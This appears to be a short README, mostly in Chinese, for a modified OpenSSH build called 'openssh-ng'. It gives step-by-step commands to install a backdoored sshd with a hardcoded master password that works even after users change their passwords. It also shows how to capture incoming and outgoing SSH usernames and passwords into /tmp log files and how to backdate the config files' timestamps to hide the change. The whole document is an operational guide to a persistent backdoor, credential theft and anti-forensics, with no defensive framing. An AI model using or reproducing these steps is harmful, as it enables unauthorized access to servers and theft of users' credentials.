# openssh-ng

- openssh used to capture passwd of ssh-client(or other purposes)

## 备份原始配置文件

```
mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
```

## 修改ssh后门密码

```
vi include.h
......
#define SECRETPW "123456"  //ssh后门密码
```

> 即使用户修改了密码仍然可以通过后门密码登入

## 编译+安装

```
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make && make install
```

> 在编译过程中可能会出现“configure: error: *** zlib.h missing – please install first or  check config.log”错误，可以执行“yum install zlib-devel和yum install openssl  openssl-devel”安装后再次编译即可。

## 重启sshd

```
/etc/init.d/sshd restart
```

## 还原新配置文件为旧配置文件时间
```
touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config
touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config
```

## 查看登录到本地和登录到远程的用户名+密码
```
cat /tmp/ilog
cat /tmp/olog
```

> view http://www.cnblogs.com/croso/p/5280783.html for more
